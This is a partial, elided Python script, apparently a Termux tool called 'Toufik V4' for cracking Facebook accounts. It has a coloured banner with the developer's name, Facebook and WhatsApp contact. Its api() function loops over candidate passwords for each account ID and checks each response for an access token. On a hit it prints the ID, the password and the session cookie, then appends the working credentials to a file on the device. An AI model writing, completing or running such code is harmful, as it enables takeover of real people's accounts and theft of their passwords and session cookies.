...
def tanim():
        ...
        return ua
logo= ("""        
\x1b[38;5;83m ______          ____ __  
\x1b[38;5;84m/_  __/__  __ __/ _(_) /__
\x1b[38;5;85m / / / _ \/ // / _/ /  '_/
\x1b[38;5;86m/_/  \___/\_,_/_//_/_/\_\    \x1b[38;5;197m(V4)
\x1b[38;5;77m──────────────────────────────────────────────                 
\x1b[38;5;78m〘✧〙DEVLOPER  \x1b[38;5;222m➤  \x1b[38;5;78m TOUFIK 💔 HOSSAIN
\x1b[38;5;79m〘✧〙FACEBOOK  \x1b[38;5;222m➤  \x1b[38;5;79m T O U F I K
\x1b[38;5;115m〘✧〙WHATSAPP  \x1b[38;5;222m➤   \x1b[38;5;115m+880132234287*
...
def api(ids,pwv,tl):
    ...
    sys.stdout.write(f'\r\x1b[38;5;155m[➤] TOUFIK👀FINDING  \x1b[38;5;155m[{loop}]  \x1b[38;5;155mOK :- {GREEN}{len(oks)} ');sys.stdout.flush()
    try:
        for pas in pwv:
            adid = str(uuid.uuid4())
            ...
            if 'access_token' in po:
                ...
                print(f'\r\x1b[38;5;84m[TOUFIK-LIVE] '+ids+' ~~ '+pas+'\x1b[38;5;155m')
                print('\033[1;92m[COOKIE] : ➤ : '+kuki+'\x1b[38;5;223m');linex()
                oks.append(ids)
                open('/sdcard/TOUFIK-OKS.txt','a').write(ids+' | '+pas+'\n')
                break
            else:continue
        loop+=1
